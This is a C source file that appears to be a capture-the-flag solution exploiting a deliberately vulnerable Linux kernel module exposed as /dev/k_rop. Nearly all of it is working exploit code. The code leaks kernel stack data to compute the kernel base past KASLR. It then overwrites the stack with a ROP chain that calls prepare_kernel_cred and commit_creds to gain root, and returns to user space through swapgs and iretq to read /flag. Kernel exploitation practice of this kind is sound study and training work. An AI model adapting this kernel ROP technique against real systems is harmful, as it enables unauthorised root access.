
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>


#define SIZE 0x200

#define KERNEL_BASE_CONSIDERING_NO_KASLR 0xffffffff81000000
#define OFFSET_POP_RDI_RET  (0xffffffff810031c4 - KERNEL_BASE_CONSIDERING_NO_KASLR)
#define OFFSET_PREPARE_KERNEL_CRED (0xffffffff81094670 - KERNEL_BASE_CONSIDERING_NO_KASLR)
#define LEAK_OFFSET 0x201532

// gadgets for commit_creds
#define OFFSET_MOV_RCX_RAX (0xffffffff814489f4 - KERNEL_BASE_CONSIDERING_NO_KASLR)
#define OFFSET_MOV_RDI_RCX (0xffffffff810e8134 - KERNEL_BASE_CONSIDERING_NO_KASLR) // RDX Must be 0 because this gadget performs a sub rdi, rdx
#define OFFSET_POP_RDX_RET (0xffffffff81051398 - KERNEL_BASE_CONSIDERING_NO_KASLR)
#define OFFSET_COMMIT_CREDS (0xffffffff810943D0 - KERNEL_BASE_CONSIDERING_NO_KASLR)

// gadgets to come back to user space
#define OFFSET_SWAPGS_RET (0xffffffff81c14530 - KERNEL_BASE_CONSIDERING_NO_KASLR)
#define OFFSET_IRETQ (0xffffffff8102c61b - KERNEL_BASE_CONSIDERING_NO_KASLR)


unsigned long long user_cs, rflags, user_rsp, user_ss;

void get_regs(){
    asm volatile(
        ".intel_syntax noprefix\n"
        "mov %0, cs\n"
        "mov %1, rsp\n"
        "mov %2, ss\n"
        "pushf\n"
        "pop %3\n"
        : "=r"(user_cs), "=r"(user_rsp), "=r"(user_ss), "=r"(rflags)
        :
        :
    );
}

void win(){
    char buf[0x100] = {0};
    int fd = open("/flag", O_RDONLY);

    
    read(fd, buf, 0x100);
    write(1, buf, 0x100);

}

int main(int argc, char *argv[]){

    char buff[SIZE];
    int fd;
    int i;
    unsigned long long *ptr; 
    ptr = (unsigned long long *)buff;

    fd = open("/dev/k_rop", O_RDWR);
    if(fd < 0){
        perror("error opening file");
        return -1;
    }

    // First, we read and leak data from kernel space using a read;
    // The kernel module is implementing it through the k_rop_read function which contains the  vulnerability:
    
    // prototype: read(file_descriptor, where_to_save_data, size)
    read(fd, buff, SIZE);

    // print what we get from kernel space as qword along with the index
    for( i=0; i < SIZE / 8 ; i++){
        printf("%03d) 0x%llx\n", i, ptr[i]);
    }

    get_regs();
    // PLAN: Execute commit_creds(prepare_kernel_cred(0)), so we want to perform these chain of call using a rop chain
    
    // Compute the kernel base. From the for loop above (34-36), we understood that at ptr[32] we have the canary and at ptr[33] we have the leak
    unsigned long long kernel_base = ptr[33] - LEAK_OFFSET;
    printf("Kernel base: 0x%llx\n", kernel_base);

    // this is to decide when we want to perform the write
    
    //calling prepare_kernel_cred(0)
    ptr[33] = kernel_base + OFFSET_POP_RDI_RET;
    ptr[34] = 0;
    ptr[35] = kernel_base + OFFSET_PREPARE_KERNEL_CRED;
    //calling commit_creds (with the result of prepare_kernel_creds as parameter)
    ptr[36] = kernel_base + OFFSET_MOV_RCX_RAX;
    ptr[37] = kernel_base + OFFSET_POP_RDX_RET;
    ptr[38] = 0;
    ptr[39] = kernel_base + OFFSET_MOV_RDI_RCX;
    ptr[40] = 0;                                  // the gadget mov rdi, rcx also increments the stack pointer by 8, so we need a dummy quadword here, we could have also 0xdeadbeef
    ptr[41] = kernel_base + OFFSET_COMMIT_CREDS;
    //Technically, now we should have the process set to root
    ptr[42] = kernel_base + OFFSET_SWAPGS_RET; // SWAPGS
    ptr[43] = kernel_base + OFFSET_IRETQ;      // IRETQ
    ptr[44] = win;                             // RIP: ADDRESS OF A FUNCTION THAT PRINTS ME THE FLAG -> win function
    ptr[45] = user_cs;                         // CS 
    ptr[46] = rflags;                          // RFLAGS
    ptr[47] = user_rsp;                        // RSP
    ptr[48] = user_ss;                         // SS
    
    write(fd, buff, SIZE);

}